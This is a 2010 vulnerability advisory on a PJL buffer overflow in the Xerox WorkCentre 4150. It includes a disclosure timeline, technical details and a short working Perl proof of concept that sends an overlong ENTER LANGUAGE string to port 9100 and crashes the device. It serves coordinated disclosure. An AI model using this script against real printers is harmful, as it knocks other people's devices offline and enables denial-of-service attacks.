#####################################################################################

Application:   Xerox Workcenter 4150 Remote Buffer Overflow

Platforms:   Xerox Workcenter 4150

Discover Date:   2009-12-21

Author:   Francis Provencher (Protek Research Lab's)

Blog:   http://www.Protekresearchlab.com


#####################################################################################

1) Introduction
2) Report Timeline
3) Technical details
4) The Code


#####################################################################################

=================
1) Introduction
=================

The Xerox WorkCentre 4150 multifunction is the affordable transition to the next level of productivity
for your office. One easy-to-use device offers powerful printing, copying, scanning, and faxing.

#####################################################################################

====================
2) Report Timeline
====================

2009-12-22  Vendor Contacted
2009-12-22  Vendor Response
2009-12-22  Vendor request a PoC
2009-12-23  PoC is sent
2009-12-28  Vendor confirm the vulnerability
2010-01-27  Vendor release a Patch
2010-01-28  Public release of this advisory

#####################################################################################

======================
3) Technical details
======================

During a brief assessment we performed on a Xerox WorkCentre 4150 it was discovered that PJL daemon
implementation contains a weakness related to robustness of PJL protocol handling. Attacker can crash
the service with a relatively simple attack. Recovering from the denial-of-service condition requires
power cycling the device. Due to the black box nature of this Proof of concept attack, we are unable to know
if remote code execution is possible.

On the LCD screen we can see this message;

System Fault: (ubEmulationLen <= Longest_Lang_Length) && The result of strlen() is invalid
file PJL_Misc.c, line 174, task PJL



#####################################################################################

=============
4) The Code
=============

#!/usr/bin/perl -w


use IO::Socket;
if (@ARGV < 1){
exit
}
$ip = $ARGV[0];
#open the socket
my $sock = new IO::Socket::INET (
PeerAddr => $ip,
PeerPort => '9100',
Proto => 'tcp',
);


$sock or die "no socket :$!";
send($sock, "\033%-12345X\@PJL ENTER LANGUAGE = AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n",0);



close $sock;




#####################################################################################
(PRL-2009-26)